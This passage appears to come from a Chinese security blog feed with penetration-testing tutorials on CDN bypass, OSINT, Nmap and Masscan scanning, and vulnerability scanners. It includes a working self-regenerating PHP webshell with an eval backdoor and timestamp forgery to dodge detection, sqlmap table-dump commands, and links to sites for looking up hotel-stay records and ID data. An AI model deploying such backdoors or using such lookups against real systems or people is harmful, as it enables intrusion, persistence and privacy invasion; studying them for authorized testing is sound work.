Network，内容分发网络）将源站的内容发布到接近用户的网络“边缘”，用户可以就近获取所需数据，不仅降低了网络的拥塞状况、提高请求的响应速度，也能够减少源站的负载压力。 传统的网络访问过程： 访问过程大概如下： 1.用户输入访问的域名，操作系统向LocalDNS查询域名的ip地址 2.LocalDns向RootDNS 查询域名的授权服务器 3.RootDNS查询域名记录后，回应给LocalDNS 4.LocalDNS将得到的域名ip地址，回应给客户端 5.用户得到域名ip地址后，访问站点服务器 6.站点服务器应答请求，将内容返回给客户端 CDN 访问过程： 访问过程大概如下： 1.用户输入访问的域名，操作系统向 LocalDns 查询域名的 ip 地址 2.LocalDns 向 ROOT DNS 查询域名的授权服务器 3.ROOT DNS 将域名授权DNS记录回应给 LocalDns 4.LocalDns 得到域名记录后，向智能调度DNS查询域名的ip地址 5.智能调度DNS 根据一定的算法和策略(比如静态拓扑，容量等),将最适合的CDN节点ip地址回应给 LocalDns 6.LocalDns 将得到的域名ip地址，回应给 用户端 7.用户得到域名 ip 地址后，访问站点服务器 8.CDN节点服务器应答请求，将内容返回给客户端 CDN 判断与绕过ping 命令直接 ping 查询地址信息： 有些是直接可以看到waf、cdn等字样的域名 很多厂商可能让 www 使用cdn，空域名不使用 CDN 缓存。所以直接 ping xxx.com 可能就能得到真实IP slookup 查询1234567891011121314151617181920# 用了 CDN➜ ~ nslookup www.baidu.comServer: 10.20.120.150Address: 10.20.120.150#53Non-authoritative answer:www.baidu.com canonical name = www.a.shifen.com.Name: www.a.shifen.comAddress: 180.101.49.11Name: www.a.shifen.comAddress: 180.101.49.12# 没有用 CDN➜ ~ nslookup www.sqlsec.comServer: 10.20.120.150Address: 10.20.120.150#53Non-authoritative answer:Name: www.sqlsec.comAddress: 121.196.37.183 域名解析结果为多个 ip，多半使用了CDN，是不真实的 ip。 多地 ping 爱站超级 ping: https://ping.aizhan.com/ 站长之家多地 ping: http://ping.chinaz.com/ 解析历史记录查询查询 ip 与域名绑定历史记录，可能会发现使用 CDN 之前的目标 ip。 https://viewdns.info/ https://x.threatbook.cn/ https://sitereport.netcraft.com/ 子域名绕过很多网站主站的访问量会比较大。所以往往主站都是挂了CDN的，但是分站就不一定了，毕竟CDN要钱，而且也不便宜,企业业务线众多，有些站点的主站使用了CDN，或者部分域名使用了CDN，某些子域名可能未使用，结合之前的子域名爆破来进行收集。 利用站点功能主动发起请求一些网站提供注册服务，可能会验证邮件，还有 RSS 订阅邮件、忘记密码等等 可能服务器本身自带 sendmail 可以直接发送邮件，当然使用第三方的除外（如网易、腾讯的等）通过邮件发送地址往往也能得到服务器 IP 利用网站漏洞如果目标站点存在漏洞，这就没办法避免了。例如 phpinfo 敏感信息泄露、Struts2、网页源代码泄露、svn 信息泄露信、Github 信息泄露等 若存在 Web 漏洞，服务器主动与我们发起请求连接，我们也能获取目标站点真实 ip，例如 XSS 等 国外访问国内的 CDN 往往只会针对国内用户访问加速，但是国外就不一定了。因此通过国外代理访问就能查看真实 IP 了，或者通过国外的 DNS 解析，可能就能得到真实的 IP 社工信息收集whois查询whois.bugscaner.com whois.aizhan.com whois.chinaz.com 注册网站查询www.reg007.com 密码泄露查询https://haveibeenpwned.com TG 群信息收集1关键词 inurl:t.me 开房记录查询http://www.cxjlkf.com 国家职业资格证查询http://zscx.osta.org.cn 其他查询身份证查询http://www.2cha.com 经纬度查询http://www.gpsspg.com/maps.htm http://map.yanue.net/ http://www.gzhatu.com/jingweidu.html 微信搜索https://weixin.sogou.com 泄露网站查询https://haveibeenpwned.com/PwnedWebsites 邮件泄露查询https://www.hotsheet.com/inoitsu/ 密码强度检测https://passwordsecurity.info https://haveibeenpwned.com/Passwords Github 信息收集可以使用谷歌搜索语法： 也可以使用 Github 自带搜索（推荐）： linux密码 123mysql数据库passworddb_pass 点code查 https://github.com/xiao1230546/www.zhanglitong.com/blob/b34e59eb93ad419a216093e1705853f054aea1f0/%E5%B9%B3%E5%8F%B0%E8%B5%84%E6%96%99.txt 主动信息收集Nmap 与 MasscanNmap 介绍官网：https://nmap.org/ Nmap 的英文全称是“Nmap Network Mapper”，中文翻译过来就是“网络映射器”。 Nmap 是一款开源的端口扫描神器，它可以快速地扫描大型网络也可以扫描单个主机。 端口扫描是指人为发送一组端口扫描信息，试图以了解某台计算机的弱点，并了解其提供的计算机网络服务类型。 端口介绍#### TCP 端口 TCP是一种面向有连接的传输协议，只有确认通信对端存在时，才会发送数据，从而可以控制通信流量的浪费。同时，TCP还充分实现数据传输过程中的各种控制，可以再数据丢包 的时候重发，还可以对次序乱掉的分包进行顺序控制。 UDP 端口UDP传输不提供复杂的控制机制，它利用IP提供面向无连接的通信服务。UDP报文没有可靠性保证，顺序保证，和流量控制，可靠性比较差，传输过程中即使出现包丢失也不会重发。 也正是因为这些，它的资源消耗小，传输速度快，通常音频，视频在传送时用UDP传输较多。 协议端口端口如同是一个房间的门，这个房间有多少个门呢？有65536 个之多，也就是说端口的取值范围是 0~65535 个。本地操作系统会给那些有需求的进程分配协议端口，每个协议端口有一个正整数标识，如 80、139、445 等。 端口 协议 21 FTP 22 SSH 23 Tenet 服务 25 SMTP 邮件传输协议 80 HTTP 服务相关端口 110 POP3 E-mail 135 共享文件或共享打印机 443 HTTP 服务相关常用端口 SSL 445 文件或打印机共享服务 1433 MS SQL Server 数据库 1521 Oracle 数据库 3306 MySQL 数据库 3389 Windows 远程桌面服务 5432/5433 PostgreSQL 数据库端口 6379 Redis 存储默认端口 7001 Weblogic 默认端口 8080 HTTP 服务常用端口 8000 - 8100 HTTP 服务常用端口 9200 Elasticsearch 默认端口 11211 Memcached 分布式缓存系统端口 端口状态Nmap 进行端口扫描的时候，Nmap 会把扫描到的端口信息反馈回来，我们从反馈回来的信息就可以判断目标端口情况。 状态 说明 Open 端口对外开放 Closed 端口对外关闭 Fitered 无法判断 被防火墙设备拦截过滤 nfiltered 未被过滤 使用 ACK 扫描才可能出现这种情况 Open\ Filtered 不能确定开放或者过滤 可能被专业设备阻止探测了 Closed\ Filtered 不能确定关闭还是被过滤 主机发现本节所用到的 Nmap 命令表： 选项 解释 -sP Ping 扫描 -P0/-Pn 无 Ping 扫描 -PS TCP SYN Ping 扫描 -PA TCP ACK Ping 扫描 -PU UDP Ping 扫描 -PE;-PP;-PM ICMP Ping Types 扫描 -PR ARP Ping 扫描 -sL 列表扫描 -6 扫描 IPv6 地址 –traceroute 路由跟踪 -PY SCTP INIT Ping 扫描 一个简单的扫描该扫描方式可以快递地对 IP 或者域名进行扫描： 可以使用 –packet-trace 查看协议扫描的细节： 1nmap 10.11.29.138 --packet-trace 可以使用 -v 查看详细地输出，漫长的扫描的过程就不会显得那么枯燥，而且可以提升逼格。 1nmap 10.11.29.138 -v 查看Linux源： 1cat /etc/apt/sources.list sudo apt-get update 自动使用最近源，指定是多此一举 使用 Zenmap 进行扫描Zenmap 是 Nmap 官方的图形化界面，比较方便初学者使用的同时也提供了很多高级特性。 Ping 扫描Ping 扫描只进行 Ping，然后显示出在线的主机，可以比较快速地获取目标信息而不会被轻易发现。 123456789101112131415nmap 10.20.24.1/24 -sPStarting Nmap 7.80 ( https://nmap.org ) at 2020-07-26 14:59 CSTNmap scan report for 10.20.24.15Host is up (0.016s latency).Nmap scan report for 10.20.24.231Host is up (0.0021s latency).Nmap scan report for 10.20.24.236Host is up (0.00068s latency).Nmap scan report for 10.20.24.238Host is up (0.0019s latency).Nmap scan report for 10.20.24.239Host is up (0.0018s latency).Nmap scan report for 10.20.24.244Host is up (0.00087s latency).Nmap done: 256 IP addresses (6 hosts up) scanned in 3.36 seconds 也可以直接使用 Ping 命令来发现局域网主机： Linux 主机 123456789101112#!/bin/baship=&quot;172.16.114.&quot;echo &quot;ping log:&quot; &gt; ./ping.txtfor i in &#123;1..254&#125;do ping -c 1 -w 1 -W 1 $ip$i | grep -q &quot;ttl=&quot; &amp;&amp; echo &quot;$ip$i [yes]&quot; &gt;&gt; ./ping.txt || echo &quot;$ip$i [no]&quot; &gt;&gt; ./ping.txt &amp;doneecho &quot;wait 5s....&quot;sleep 5cat ./ping.txtcat ./ping.txt | wc -l Windows 主机 1for /l %p in (1,1,254) do @ping 10.20.24.%p -n 1 -l 16 -w 20 |find &quot;TTL=&quot; /I 无 Ping 扫描用户防火墙禁止 Ping 的情况下，可以使用 -P0 或者 -Pn可以避免被防火墙发现。 nmap无法突破windows防火墙，但是内网中很多域为方便都是不开防火墙的，所以nmap依旧吃香。 开防火墙后扫描3306（已知开放）： 1nmap 10.11.29.138 -p 3306 -Pn TCP SYN Ping 扫描通常情况下，Nmap 默认 Ping 扫描是使用 TCP ACK 和 ICMP Echo 请求对目标进行是否存活的响应，当目标主机的防火墙阻止这些请求时，我们可以使用 TCP SYN Ping 扫描来对目标主机进行存活判断： 123456789nmap 10.20.24.244 -PSStarting Nmap 7.80 ( https://nmap.org ) at 2020-07-26 16:54 CSTNmap scan report for 10.20.24.244Host is up (0.00014s latency).Not shown: 997 closed portsPORT STATE SERVICE88/tcp open kerberos-sec4000/tcp open remoteanything5900/tcp open vnc 有时候这种扫描结果不不准确，这个时候需要制定一个端口或端口范围来避免这种情况。 TCP ACK Ping 扫描使用 -PA选项可以进行 TCP ACK Ping 扫描，它与 TCP SYN Ping 扫描比较类似，区别在于 TCP 的标志位是 ACK 而不是 SYN，使用这种方式可以探测阻止 SYN 包或 ICMP Echo 请求的主机。 123456789➜ ~ nmap 10.20.24.244 -PAStarting Nmap 7.80 ( https://nmap.org ) at 2020-07-26 17:02 CSTNmap scan report for 10.20.24.244Host is up (0.0014s latency).Not shown: 743 closed ports, 254 filtered portsPORT STATE SERVICE88/tcp open kerberos-sec4000/tcp open remoteanything5900/tcp open vnc 也可以同时使用-PS与-PA 既发送 SYN 又发送 ACK，提高通过防火墙的概率： 123456789➜ ~ nmap 10.20.24.244 -PS -PAStarting Nmap 7.80 ( https://nmap.org ) at 2020-07-26 17:03 CSTNmap scan report for 10.20.24.244Host is up (0.00040s latency).Not shown: 997 closed portsPORT STATE SERVICE88/tcp open kerberos-sec4000/tcp open remoteanything5900/tcp open vnc UDP Ping 扫描需要使用 root 权限来运行，使用 -PU 选项可以发送一个空的冷门的 UDP 报文到指定端口，如果目标主机响应则返回一个 ICMP 端口不可达错误，如果目标主机不是存活状态则会返回各种 ICMP 错误信息。 12345678910➜ ~ sudo nmap 10.20.24.244 -PUPassword:Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-26 17:07 CSTNmap scan report for 10.20.24.244Host is up (0.00012s latency).Not shown: 997 closed portsPORT STATE SERVICE88/tcp open kerberos-sec4000/tcp open remoteanything5900/tcp open vnc 尝试手动来验证看看： 1sudo nmap 10.20.24.244 -PU --packet-trace |grep 5900 CMP Ping Types 扫描使用-PE、-PP、-PM选项可以进行 ICMP Ping Types 扫描。ICMP（Internet Control Message Protocol）是 Internet 控制报文协议。是 TCP/IP 协议族的一个子协议，用于在 IP 主机、路由器之间传递控制消息，控制消息是指网络通不通、主机是否可达、路由是否可用等网络本身的消息。这些控制消息虽然并不传输用户数据，但是对于用户数据的传递起着重要的作用。 ICMP Echo 扫描-PE 选项可以发起一个 ICMP Echo 扫描来探测目标主机是否在线，因为很多主机的防火墙会禁止这些报文，所以外网扫描基本上不好用，可以用于内网扫描。 12345678➜ ~ sudo nmap 10.20.24.244 -PEStarting Nmap 7.80 ( https://nmap.org ) at 2020-07-26 18:34 CSTNmap scan report for 10.20.24.244Host is up (0.00014s latency).Not shown: 998 closed portsPORT STATE SERVICE4000/tcp open remoteanything5900/tcp open vnc ICMP 时间戳 Ping 扫描大多数防火墙可能不允许 ICMP Echo 请求，但是由于配置不当可能回复 ICMP 时间错请求，所以可以使用 -PP 时间戳扫描来确定目标主机是否存活。 12345678➜ ~ sudo nmap 10.20.24.244 -PPStarting Nmap 7.80 ( https://nmap.org ) at 2020-07-26 18:34 CSTNmap scan report for 10.20.24.244Host is up (0.000029s latency).Not shown: 809 closed ports, 189 filtered portsPORT STATE SERVICE4000/tcp open remoteanything5900/tcp open vnc ICMP 地址掩码 Ping 扫描这种扫描方式会试图用备选的 ICMP 登记 Ping 指定主机，通常有不错的穿透防火墙的效果。 123456789➜ ~ sudo nmap 10.20.24.244 -PMPassword:Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-26 19:05 CSTNmap scan report for 10.20.24.244Host is up (0.00011s latency).Not shown: 998 closed portsPORT STATE SERVICE4000/tcp open remoteanything5900/tcp open vnc ARP Ping 扫描-PR选项通常在扫描局域网时使用，ARP（Address Resolution Protocol）地址解析协议，是根据 IP 地址获取物理地址的一个 TCP/IP 协议，在内网中使用 ARP Ping 扫描方式比较搞笑，在本地局域网中防火墙基本上不会禁止 ARP 请求，所以比其他 Ping 扫描效率都更高。 1234567891011121314151617181920➜ ~ nmap 10.20.24.244 -PRStarting Nmap 7.80 ( https://nmap.org ) at 2020-07-26 19:10 CSTNmap scan report for 10.20.24.244Host is up (0.0014s latency).Not shown: 746 closed ports, 252 filtered portsPORT STATE SERVICE4000/tcp open remoteanything5900/tcp open vncNmap done: 1 IP address (1 host up) scanned in 2.64 seconds➜ ~ nmap 10.20.24.244Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-26 19:11 CSTNmap scan report for 10.20.24.244Host is up (0.00026s latency).Not shown: 998 closed portsPORT STATE SERVICE4000/tcp open remoteanything5900/tcp open vncNmap done: 1 IP address (1 host up) scanned in 7.73 seconds 扫描列表显示扫描的所有主机的列表 1234567891011121314➜ ~ nmap 10.20.24.10-20 -sLStarting Nmap 7.80 ( https://nmap.org ) at 2020-07-26 19:19 CSTNmap scan report for 10.20.24.10Nmap scan report for 10.20.24.11Nmap scan report for 10.20.24.12Nmap scan report for 10.20.24.13Nmap scan report for 10.20.24.14Nmap scan report for 10.20.24.15Nmap scan report for 10.20.24.16Nmap scan report for 10.20.24.17Nmap scan report for 10.20.24.18Nmap scan report for 10.20.24.19Nmap scan report for 10.20.24.20Nmap done: 11 IP addresses (0 hosts up) scanned in 0.01 seconds 可以使用 Masscan 批量生成 IP 地址表： 123masscan -sL 10.0.0.0/24 &gt; c段.txtmasscan -sL 10.0.0.0/16 &gt; b段.txtmasscan -sL 10.0.0.0/8 &gt; a段.txt 扫描一个 IPv6 地址IPv6 是 Internet Protocol Version 6 的缩写，用于替代现在用的 IPv4 的下一代 IP 协议，Nmap 很早就支持对 IPv6 的扫描，使用 -6 选项就可以进行对 IPv6 的扫描。 12345678➜ ~ nmap -6 1::224:11cStarting Nmap 7.80 ( https://nmap.org ) at 2020-07-26 19:34 CSTNmap scan report for 1::224:11cHost is up (0.00028s latency).Not shown: 968 closed ports, 30 filtered portsPORT STATE SERVICE88/tcp open kerberos-sec5900/tcp open vnc 路由跟踪使用 –traceroute 可以轻松地查出从本地计算机到目标之间所经过的网络节点，并可以查看过各个节点的时间： 1234567891011121314151617181920212223242526272829➜ ~ sudo nmap www.sqlsec.com --traceroutePassword:Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-26 19:35 CSTNmap scan report for www.sqlsec.com (121.196.37.183)Host is up (0.0018s latency).Not shown: 991 closed portsPORT STATE SERVICE21/tcp open ftp22/tcp open ssh80/tcp open http111/tcp open rpcbind443/tcp open https445/tcp filtered microsoft-ds888/tcp open accessbuilder3306/tcp open mysql4444/tcp filtered krb524TRACEROUTE (using port 3389/tcp)HOP RTT ADDRESS1 1.41 ms 10.20.24.12 0.38 ms 172.16.0.13 6.50 ms 61.164.47.1934 ...5 1.70 ms 61.164.31.2186 2.51 ms 115.236.101.737 1.78 ms 45.112.223.298 1.92 ms 103.41.142.1739 ... 1011 1.77 ms 121.196.37.183 SCTP INIT Ping 扫描SCTP（Stream Control Transmission Protocol，流控制传输协议）是在 2000 年定义的一个传输层，SCTP 可以看作是 TCP 协议的改进。 12345678910➜ ~ sudo nmap 10.20.24.15 -PYStarting Nmap 7.80 ( https://nmap.org ) at 2020-07-26 19:40 CSTNmap scan report for 10.20.24.15Host is up (0.0071s latency).Not shown: 996 closed portsPORT STATE SERVICE22/tcp open ssh199/tcp open smux443/tcp open https8888/tcp open sun-answerbook 探索网络本节所用到的 Nmap 命令表： 选项 解释 -T 指定时间模板 -p 指定端口 -sS TCP SYN 扫描 -sU UDP 扫描 -sN;-sF;-sX 隐蔽扫描 -sA TCP ACK 扫描 -sW TCP 窗口扫描 时间模板在 Nmap 提供了一些简单的方法，使用 6 个时间模板，使用时采用 -T 选项及数字 (0 - 5) 或名称。模板名称有paranoid (0)、sneaky (1)、polite (2)、normal(3)、 aggressive (4)和insane (5) 选项 说明 -T0 偏执的 非常慢，用于 IDS 躲避 -T1 鬼祟的 缓慢的扫描，用于 IDS 躲避 -T2 文雅的 降低了扫描速度以使用更少的带宽和目标主机资源 -T3 普通的 默认模式 根据目标的反应自动调整时间 -T4 野蛮的 假设用户具有可靠的网络从而加速扫描，可能会漏扫 -T5 疯狂的 极速扫描，为了获得速度而牺牲准确性 指定端口可以指定端口号进行扫描，可以是一个端口也可以是一个范围： 12345678910111213141516171819202122232425262728293031323334353637➜ ~ nmap 10.20.24.1/24 -p 22Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-26 20:34 CSTNmap scan report for 10.20.24.15Host is up (0.0077s latency).PORT STATE SERVICE22/tcp open sshNmap scan report for 10.20.24.231Host is up (0.00050s latency).PORT STATE SERVICE22/tcp open sshNmap scan report for 10.20.24.236Host is up (0.00051s latency).PORT STATE SERVICE22/tcp open sshNmap scan report for 10.20.24.238Host is up (0.00061s latency).PORT STATE SERVICE22/tcp closed sshNmap scan report for 10.20.24.239Host is up (0.00070s latency).PORT STATE SERVICE22/tcp open sshNmap scan report for 10.20.24.244Host is up (0.0019s latency).PORT STATE SERVICE22/tcp closed ssh TCP SYN 扫描比较常用的扫描方式，也被称为半开放扫描，因为不用进行 TCP 连接 3 次握手，所以速度比较快，平均一秒可以扫描上千个端口，而且相对来说也比较隐蔽，很难被防火墙或管理员发现，因为不会进行 TCP 连接，如果出现被过滤的情况，可以考虑使用 SYN 扫描，可以很明确地区分出端口的开放状态。 1234567891011➜ ~ sudo nmap 10.20.24.15 -sSPassword:Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-26 20:41 CSTNmap scan report for 10.20.24.15Host is up (0.0071s latency).Not shown: 996 closed portsPORT STATE SERVICE22/tcp open ssh199/tcp open smux443/tcp open https8888/tcp open sun-answerbook TCP 连接扫描当 -sS 不能使用的时候，可以使用 -sT 更加基础、稳定的扫描方式。 UDP 扫描因为要等待目标主机响应，所以速度比较慢，一般配合 -p 指定端口来使用，否则很耗费时间。 隐蔽扫描 -sN Null 扫描 -sF FIN 扫描 -sX Xmas 扫描这些扫描方式会躲过一些无状态防火墙的过滤，效果会更隐蔽。 TCP ACK 扫描确定是无法判断端口是开放还是过滤的。unfiltered 表明 ACK 报文不能到达，filtered 表示不响应的端口。 TCP 窗口扫描类似于ACK 扫描，通过返回的窗口大小数据判断目标端口是否开放或者关闭。扫描结果是不准确的，如果 100 个端口里面只有 2 个关闭的，那很可能是开放的。 指纹探测Nmap 不仅是一款端口扫描工具，还可以对主机的服务及版本进行识别和探测。 本节所使用的命令表： 选项 说明 -sV 版本探测 -A 更加详细直观的扫描 –version-intensity 设置扫描强度 1~9 默认为 7 –version-light 轻量级扫描 强度为 2 –version-all 重量级扫描 强度为 9 -O 启用操作系统探测 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556# 版本探测➜ ~ nmap 10.20.24.244 -sVStarting Nmap 7.80 ( https://nmap.org ) at 2020-07-26 21:12 CSTNmap scan report for 10.20.24.244Host is up (0.30s latency).Not shown: 999 closed portsPORT STATE SERVICE VERSION5900/tcp open vnc Apple remote desktop vncService Info: OS: Mac OS X; CPE: cpe:/o:apple:mac_os_xService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 6.98 seconds ~ nmap 10.20.24.244 -AStarting Nmap 7.80 ( https://nmap.org ) at 2020-07-26 21:13 CSTNmap scan report for 10.20.24.244Host is up (0.00026s latency).Not shown: 999 closed portsPORT STATE SERVICE VERSION5900/tcp open vnc Apple remote desktop vnc|_ssl-cert: ERROR: Script execution failed (use -d to debug)|_ssl-date: ERROR: Script execution failed (use -d to debug)|_sslv2: ERROR: Script execution failed (use -d to debug)|_tls-alpn: ERROR: Script execution failed (use -d to debug)|_tls-nextprotoneg: ERROR: Script execution failed (use -d to debug)|_vnc-info: ERROR: Script execution failed (use -d to debug)Service Info: OS: Mac OS X; CPE: cpe:/o:apple:mac_os_xService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 7.81 seconds# 操作系统探测➜ ~ sudo nmap 10.211.55.17 -OStarting Nmap 7.80 ( https://nmap.org ) at 2020-07-26 21:25 CSTNmap scan report for windows-7-1.shared (10.211.55.17)Host is up (0.00015s latency).Not shown: 991 closed portsPORT STATE SERVICE135/tcp open msrpc139/tcp open netbios-ssn445/tcp open microsoft-ds49152/tcp open unknown49153/tcp open unknown49154/tcp open unknown49155/tcp open unknown49156/tcp open unknown49158/tcp open unknownMAC Address: 00:1C:42:86:1B:DE (Parallels)Device type: general purposeRunning: Microsoft Windows 7|2008|8.1OS CPE: cpe:/o:microsoft:windows_7::- cpe:/o:microsoft:windows_7::sp1 cpe:/o:microsoft:windows_server_2008::sp1 cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows_8.1OS details: Microsoft Windows 7 SP0 - SP1, Windows Server 2008 SP1, Windows Server 2008 R2, Windows 8, or Windows 8.1 Update 1Network Distance: 1 hopOS detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 3.54 seconds 保存输出 选项 说明 -oN 标准保存 -oX XML 保存 快速找到.xml文件中的ip: VSCode ctrl + f 用最右面正则表达式搜索 1((2(5[0-5]|[0-4]\d))|[0-1]?\d&#123;1,2&#125;)(\.((2(5[0-5]|[0-4]\d))|[0-1]?\d&#123;1,2&#125;))&#123;3&#125; Ctrl + Shift + L 选择所有出现在当前选中的行 VSCode 批量处理ip格式问题： 123开头标记：^ 换成 http://结尾标记：$ 换成 :8080全选后再替换 Masscan项目地址：https://github.com/robertdavidgraham/masscan 12345678# 扫描整个互联网masscan 0.0.0.0/0 -p0-65535# 输出到文件中masscan 0.0.0.0/0 -p0-65535 -oX scan.xml# 默认的速率100包/秒，如果是扫描全网的话，需要提高速度。masscan 0.0.0.0/0 -p0-65535 --rate 100000 -oX scan.xml 实用正则 12345# 正则((2(5[0-5]|[0-4]\d))|[0-1]?\d&#123;1,2&#125;)(\.((2(5[0-5]|[0-4]\d))|[0-1]?\d&#123;1,2&#125;))&#123;3&#125;# 换行^\s*(?=\r?$)\n 漏洞扫描工具市面上也有很多各种各样的开源、商业扫描器。单就应用这一层来说，漏洞扫描器一般分为主动扫描和被动扫描两种。 主动扫描主动扫描一般用于黑盒测试，其形式为提供一个URL入口地址，然后由扫描器中的爬虫模块爬取所有链接，对GET、POST等请求进行参数变形和污染，进行重放测试，然后依据返回信息中的状态码、数据大小、数据内容关键字等去判断该请求是否含有相应的漏洞。例如：AWVS、Nessus、唐朝扫描器、BugScan、Pocsuite 被动扫描被动扫描，与主动扫描相比，被动扫描并不进行大规模的爬虫爬取行为，而是直接通过捕获测试人员的测试请求，直接进行参数变形和污染来测试服务端的漏洞，如果通过响应信息能够判断出漏洞存在，则进行记录管理，有人工再去进行漏洞的复现和确认。例如：BurpSuite、Xray 主动扫描与被动扫描最主要的区别为被动式扫描器不主动获取站点链接，而是通过流量、获取测试人员的访问请求等手段去采集数据源，然后进行类似的安全检测。 主动扫描的 Web 扫描器的一些不足： 由于数据源来自爬虫爬取，独立的页面、API接口等就无法覆盖，存在检测遗漏情况。 果是扫描单独的几个站点，主动扫描是够用的。但是在站点数量急剧增大的时候，主动扫描的效率、精准、速度都无法与被动扫描相比。 AWVS Acunetix Web Vulnerability Scanner（简称AWVS）是一款知名的网络漏洞扫描工具，它通过网络爬虫测试你的网站安全，检测流行安全漏洞。AWVS可以检查SQL注入漏洞，也可以检查跨站脚本攻击漏洞，可以扫描任何可以通过web浏览访问和遵循HTTP/HTTPS规则的 Web 站点和 Web应用程序。 黑科技： 扫描过程： Nessus 主机漏洞扫描 Nessus 在全世界有超过 75000 个组织在使用它。该工具提供完整的电脑漏洞扫描服务，并随时更新其漏洞数据库。Nessus 不同于传统的漏洞扫描软件，支持分布式扫描。 Linux下 Nessus 常用命令： 1234567systemctl status nessusd # 查看运行状态systemctl start nessusd # 启动 nessussystemctl stop nessusd # 停止 nessussystemctl restart nessusd# 重启 nessussystemctl enable nessusd # 开机自启systemctl disable nessusd# 关闭开机自启systemctl kill nessusd # 杀死 nessus 的子进程 基本网络扫描多用于进行主机扫描测试，可以扫描系统层面的漏洞： Web 应用测试也可以类型 AWVS 那样对 Web 应用进行测试： Xray 项目地址:https://github.com/chaitin/xray 长亭科技研发的一款完善的安全评估工具，支持常见Web安全问题扫描和自定义POC，虽然Github有项目，但是不开源，只提供社区版本供大家使用。 转载：https://www.sqlsec.com/2020/04/xray.html]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>Web</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[渗透测试基础]]></title>
    <url>%2F%2F2020%2F08%2F35d3b1d4.html</url>
    <content type="text"><![CDATA[渗透测试基础渗透测试（Penetration Testing）是指受信任的第三方通过模拟黑客的攻击技术与手段对目标网络、系统进行攻击测试，发现目标的安全隐患并给出安全加固建议的一种安全测试与评估方法。 渗透测试的概念与流程受信任16 年 11 月 7 日，《中华人民共和国网络安全法》颁布以来，一切非授权的渗透测试行为都是违法的。 模拟黑客模拟黑客行为并不是真正的黑客行为，所以在渗透测试中涉及到高危操作的时候都需要上报并记录，高危行为如下： 上传 webshell 尤其是不死马不死马.php → 上传到server → server执行文件 → server本地无限循环生成 (一句话.php) 1234567891011121314151617181920&lt;?php// 函数设置与客户机断开是否会终止脚本的执行。这里设置为true则忽略与用户的断开，即使与客户机断开脚本仍会执行ignore_user_abort(true);// 函数设置脚本最大执行时间。这里设置为0，即没有时间方面的限制set_time_limit(0);// 删除文件本身，以起到隐蔽自身的作用unlink(__FILE__);$file = 'shell.php';$code = '&lt;?php if(md5($_GET["pass"])=="1a1dc91c907325c69271ddf0c944bc72")&#123;@eval($_POST[a]);&#125; ?&gt;';while (1)&#123; file_put_contents($file,$code); // 以绕过“find –name '*.php' –mmin -10”命令检测最近10分钟修改或新创建的PHP文件 system('touch -m -d "2018-12-01 09:10:12" shell.php'); usleep(5000); // 一微秒等于百万分之一秒&#125;?&gt; 将这个文件上传到服务器，然后进行访问，会在该路径下一直生成一个名字为 shell.php 的文件，然后使用中国蚁剑输入12345678910- 如果允许，**重启**服务器是万能的。- 其次，最好的解决方案是 kill 掉www-data用户的所有子进程```linuxls -lps aux | grep www-dataps aux | grep www-data| awk &apos;&#123;print $2&#125;&apos;ps aux | grep www-data| awk &apos;&#123;print $2&#125;&apos;|xargs kill -9rm shell.php 脱裤点到为止 国安法规定脱库条目不得超过五条 一般都使用 sqlmap 来进行脱裤，使用 –start –stop 来设置脱裤的起点和终点： 例：从1开始脱5条 1sqlmap -u &quot;http://127.0.0.1:8888/Less-1/?id=1&quot; --dump -C&apos;id,username,password&apos; -T &apos;users&apos; -D &apos;security&apos; --start=1 --stop=5 如果要证明某个表下面的数量的话，直接使用 sqlmap 的 –count 参数即可 1sqlmap -u &quot;http://127.0.0.1:8888/Less-1/?id=1&quot; --count -T &apos;users&apos; -D &apos;security&apos; 非授权不要随便去做 发现隐患渗透人员在不同的位置（比如从内网、从外网等位置）利用各种手段对业务系统进行全面深入的安全测试，以此挖掘可能存在的安全缺陷和漏洞。 服务器是如何被入侵的在互联网中的一台服务器是如何被攻击者入侵的？攻击者要想先攻击服务器之前，必须先要保证他们之间能进行正常的通信。 那么此时客户端和服务端是怎么保证通信的呢？是端口。服务器上的各种服务，例如SSH、FTP、Web、数据库服务等等，它们会依托于端口来实现对外提供服务。 所以我们攻击者所入侵的其实也是端口，当然我们不排除“物理攻击”。而对于服务器的入侵方式有很多，比如端口扫描、SSH口令爆破、FTP爆破、缓冲区溢出攻击等等去直接获取目标的权限。但是由于现在 Web 应用的飞速发展，现在的战场逐渐转移到了 Web 之上。 所以正常的渗透测试流程是利用 Web 漏洞拿到 Web 权限，尝试 Getshell 拿到服务器普通用户的权限，提权拿到服务器的最高权限，服务器如果在内网的中的话，可以在内网中横向渗透在内网中拿到更多服务器的权限。 mi.com 只能扫描到8080 443 80 等Web端口 近源渗透测试近源渗透测试和传统的渗透测试的主要区别在于对“边界”概念的理解上。在传统的网络测试中，各类防火墙、入侵检测等防护产品已经较为成熟，攻击者很难通过外网的网络入口突破企业的重重防御措施。而在近源渗透测试的场景中，由于攻击者位于目标企业附近甚至建筑内部，这些地方往往存在大量被企业忽视的安全盲点。结合近源渗透的相关测试方法与技巧，测试人员可以利用各类无线通信网络、物理接口和智能设备来突破安全防线进入企业内网，最终威胁到企业的关键系统及敏感业务的信息安全。 小漫画：https://zhuanlan.zhihu.com/p/97865236 列举那些脆弱的 Web 应用CS即Client/Server(客户机/服务器)结构 C/S结构在技术上很成熟 BS即Browser/Server(浏览器/服务器)结构，就是只安装维护一个服务器(Server)，而客户端采用浏览器(Browse)运行软件。 目前 BS 越来越流行，Web 应用也越来越多，与我们的生活息息相关。下面来列举一些脆弱的 Web 应用： GOV 政府网站被挂博彩广告 